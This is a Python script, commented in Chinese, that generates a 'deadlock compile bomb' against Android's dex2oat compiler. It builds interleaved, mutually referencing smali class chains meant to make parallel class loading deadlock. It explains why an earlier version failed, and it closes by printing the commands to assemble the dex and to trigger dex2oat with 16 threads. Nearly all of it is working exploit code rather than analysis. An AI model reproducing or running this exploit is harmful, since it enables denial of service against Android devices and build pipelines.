#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
dex2oat ResolveClassFieldsAndMethodsVisitor 死锁编译炸弹 v2（高概率版）

v1 为什么失败:
  ResolveMethod<kNoChecks>(compiler_driver.cc:1595) 只解析方法的声明类,
  不解析参数/返回类型。方法签名的交叉引用不会触发 LoadClass。
  只有 ResolveField (line 1608/1616) 才解析字段的**类型**,触发 LoadClass。
  v1 每类仅 3 个字段,LoadClass 瞬间完成缓存——窗口太窄。

v2 原理——循环类加载死锁(WaitForClass mutual dependency):
  ART 的 LoadClass 流程:
    1. 插入占位符(ClassStatus < kLoaded)
    2. 加载超类(递归 LoadClass)
    3. 加载接口
    4. DefineClass → 需要解析字段类型 → ResolveField → LoadClass(字段类型)
    5. 标记 kLoaded

  如果线程 T0 正在 LoadClass(A)(有占位符)并在 DefineClass 阶段
  调用 LoadClass(B),而线程 T1 正在 LoadClass(B)(有占位符)并在
  DefineClass 阶段调用 LoadClass(A),则:
    - LoadClass(B) from T0: 发现 B 有 T1 的占位符 → WaitForClass(B) → 阻塞
    - LoadClass(A) from T1: 发现 A 有 T0 的占位符 → WaitForClass(A) → 阻塞
    → 循环等待 = 死锁

v2 结构(每对 n):
  链 A:  SuperLeafA_n(extends Object, field refToLeafB_n)
          ↑ SuperMidA_n(field refToMidB_n)
          ↑ SuperTopA_n(field refToTopB_n)
          ↑ PairA_n (extends SuperTopA_n, 8 字段 + 15 方法)

  链 B:  SuperLeafB_n(extends Object, field refToLeafA_n)  ← 镜像
          ↑ SuperMidB_n(field refToMidA_n)
          ↑ SuperTopB_n(field refToTopA_n)
          ↑ PairB_n

  class_def 表中 interleave:
    SuperLeafA_0, SuperLeafB_0, SuperMidA_0, SuperMidB_0,
    SuperTopA_0, SuperTopB_0, PairA_0, PairB_0, ...

  确保线程 T0(取 LeafA_0)和 T1(取 LeafB_0)同时处理,
  各自 LoadClass 的 DefineClass 阶段解析对方类型的字段→循环等待。
"""

import os, sys

N_PAIRS = 120     # 120 对 = 960 个类(含超类链)
LEVELS = 3        # 每链 3 层超类: Leaf → Mid → Top
FIELDS = 10       # 每类字段数(包括超类)
METHODS = 20      # Pair 类的方法数
IFACE_COUNT = 8   # 接口数
OUT_DIR = "smali"
PACKAGE = "Lb"

os.makedirs(OUT_DIR, exist_ok=True)

# --- interleaved 文件列表 ---
# 结构: 先出所有 Level 3(Leaf)的 A/B,再出 Level 2(Mid),再出 Level 1(Top),再出 Pair
# 确保任意相邻 pair_idx 的 A 和 B 会被不同线程同时处理

files = []  # [(filename, self_class_full, super_class_full, field_target_full, fields_count, is_pair, iface_indices)]

for pi in range(N_PAIRS):
    leafA_super = "Ljava/lang/Object;"
    leafB_super = "Ljava/lang/Object;"
    midA_super  = f"{PACKAGE}/LeafA{pi};"
    midB_super  = f"{PACKAGE}/LeafB{pi};"
    topA_super  = f"{PACKAGE}/MidA{pi};"
    topB_super  = f"{PACKAGE}/MidB{pi};"
    pairA_super = f"{PACKAGE}/TopA{pi};"
    pairB_super = f"{PACKAGE}/TopB{pi};"

    # 每层的字段引用的目标:指向对方的同层类
    # LeafA.field → LeafB
    # MidA.field → MidB
    # TopA.field → TopB
    # PairA.field → PairB(主) + 随机扩散

    # Level 3 (Leaf): 只有1个字段(引用对方的 Leaf)
    files.append((f"zz_LL_{pi:04d}_A",
                  f"{PACKAGE}/LeafA{pi}", leafA_super,
                  f"{PACKAGE}/LeafB{pi};", 1, False, []))
    files.append((f"zz_LL_{pi:04d}_B",
                  f"{PACKAGE}/LeafB{pi}", leafB_super,
                  f"{PACKAGE}/LeafA{pi};", 1, False, []))

    # Level 2 (Mid): 字段引用对方的 Mid
    files.append((f"zz_MM_{pi:04d}_A",
                  f"{PACKAGE}/MidA{pi}", midA_super,
                  f"{PACKAGE}/MidB{pi};", 1, False, []))
    files.append((f"zz_MM_{pi:04d}_B",
                  f"{PACKAGE}/MidB{pi}", midB_super,
                  f"{PACKAGE}/MidA{pi};", 1, False, []))

    # Level 1 (Top): 字段引用对方的 Top
    files.append((f"zz_TT_{pi:04d}_A",
                  f"{PACKAGE}/TopA{pi}", topA_super,
                  f"{PACKAGE}/TopB{pi};", 1, False, []))
    files.append((f"zz_TT_{pi:04d}_B",
                  f"{PACKAGE}/TopB{pi}", topB_super,
                  f"{PACKAGE}/TopA{pi};", 1, False, []))

    # Pair: 主类, 多字段 + 多方法
    ifaces = [f"{PACKAGE}/I{pi % IFACE_COUNT}",
              f"{PACKAGE}/I{(pi + 1) % IFACE_COUNT}"]
    files.append((f"zz_PP_{pi:04d}_A",
                  f"{PACKAGE}/PairA{pi}", pairA_super,
                  f"{PACKAGE}/PairB{pi};", FIELDS, True, ifaces))
    files.append((f"zz_PP_{pi:04d}_B",
                  f"{PACKAGE}/PairB{pi}", pairB_super,
                  f"{PACKAGE}/PairA{pi};", FIELDS, True, ifaces))

files.sort()

# 生成接口
for i in range(IFACE_COUNT):
    lines = [f".class public interface abstract {PACKAGE}/I{i};",
             ".super Ljava/lang/Object;", ""]
    for m in range(4):
        rp = (i * 13 + m * 7) % N_PAIRS
        t = f"PairA{rp}" if (i + m) % 2 == 0 else f"PairB{rp}"
        lines.append(f".method public abstract iface_m{m}()L{PACKAGE}/{t};")
        lines.append(".end method\n")
    path = os.path.join(OUT_DIR, f"xx_IF_{i:02d}.smali")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))


def gen_class(filename, own, super_cls, main_field_type, n_fields, is_pair, ifaces):
    own_short = own.split("/")[-1].rstrip(";")
    lines = [f".class public {own}",
             f".super {super_cls}"]
    for iface in ifaces:
        lines.append(f".implements {iface}")
    lines.append("")

    # 静态大数组 + <clinit>: 内存压力 → GC 概率↑
    arr_size = 0x1000 if is_pair else 0x200  # 4096 vs 512 ints
    lines.append(".field static bigArray:[I")
    lines.append(".field static bigArrayB:[B")
    lines.append("")
    lines.append(".method static constructor <clinit>()V")
    lines.append("    .registers 3")
    lines.append(f"    const/16 v0, {hex(arr_size)}")
    lines.append("    new-array v0, v0, [I")
    lines.append(f"    sput-object v0, {own}->bigArray:[I")
    lines.append(f"    const/16 v0, {hex(arr_size // 2)}")
    lines.append("    new-array v0, v0, [B")
    lines.append(f"    sput-object v0, {own}->bigArrayB:[B")
    lines.append("    return-void")
    lines.append(".end method\n")

    # 实例字段 —— 这是触发 LoadClass 的核心
    # 字段 0: 主引用(对方类的对应层级)
    lines.append(f".field public ref0:L{main_field_type}")

    if n_fields > 1:
        for fi in range(1, n_fields):
            # 轮番用不同的交叉引用类型,不让任何类型被提前缓存命中的线程"独吞"
            seed = hash(f"{own_short}_{fi}") % N_PAIRS
            if fi % 3 == 0:
                t = f"{PACKAGE}/PairA{seed};"
            elif fi % 3 == 1:
                t = f"{PACKAGE}/PairB{seed};"
            else:
                t = f"{PACKAGE}/I{seed % IFACE_COUNT};"
            lines.append(f".field public ref{fi}:L{t}")
    lines.append("")

    # 构造
    lines.append(".method public constructor <init>()V")
    lines.append("    .registers 1")
    lines.append(f"    invoke-direct {{p0}}, {super_cls}-><init>()V")
    lines.append("    return-void")
    lines.append(".end method\n")

    # Pair 类加方法(虽然不触发 LoadClass,但增加 Visit 耗时,扩大碰撞窗口)
    if is_pair:
        for m in range(METHODS):
            mp = 1 + ((m * 3 + hash(own_short)) % 5)
            params = []
            for p in range(mp):
                s = hash(f"{own_short}_m{m}_p{p}") % N_PAIRS
                if p % 3 == 0:
                    params.append(f"{PACKAGE}/PairB{s};")
                elif p % 3 == 1:
                    params.append(f"{PACKAGE}/I{s % IFACE_COUNT};")
                else:
                    params.append("I")
            param_str = "".join(params)

            # 返回类型
            if m % 3 == 0:
                ret = f"{PACKAGE}/PairB{(hash(own_short) + m) % N_PAIRS};"
            elif m % 3 == 1:
                ret = "I"
            else:
                ret = f"{PACKAGE}/I{(hash(own_short) + m) % IFACE_COUNT};"

            lines.append(f".method public m{m}({param_str}){ret}")
            lines.append(f"    .registers {mp + 2}")
            if ret == "I":
                lines.append("    const/4 v0, 0x0")
                lines.append("    return v0")
            else:
                lines.append("    const/4 v0, 0x0")
                lines.append("    return-object v0")
            lines.append(".end method\n")

    path = os.path.join(OUT_DIR, f"{filename}.smali")
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))


# 生成所有类
for fname, own, super_cls, main_ft, nf, is_pair, ifaces in files:
    gen_class(fname, own, super_cls, main_ft, nf, is_pair, ifaces)

# 统计
total = len(os.listdir(OUT_DIR))
pairs = 2 * N_PAIRS
hierarchy = 2 * N_PAIRS * LEVELS
total_methods = (pairs * METHODS + pairs * 2 + hierarchy * 2 + IFACE_COUNT * 4)
total_fields = (pairs * FIELDS + hierarchy * 1)
print(f"{total} smali 文件")
print(f"  Pair 类: {pairs} (各 {METHODS} 方法 + {FIELDS} 字段 + <clinit>)")
print(f"  超类链:  {hierarchy} ({N_PAIRS}对 × {LEVELS}层 × 2链)")
print(f"  接口:    {IFACE_COUNT}")
print(f"  总字段:  ~{total_fields} (每个字段触发一次 LoadClass)")
print(f"  总方法:  ~{total_methods}")
print(f"  Interleave: LeafA_n, LeafB_n, MidA_n, MidB_n, TopA_n, TopB_n, PairA_n, PairB_n")
print(f"  ← 确保线程池 fetch_add 将互补类分给不同线程")
print()
print(f"编译: java -jar smali.jar assemble {OUT_DIR}/ -o deadlock_bomb_v2.dex")
print(f"触发: dex2oat --dex-file=deadlock_bomb_v2.dex --oat-file=/data/local/tmp/b.oat --compiler-filter=speed -j16")
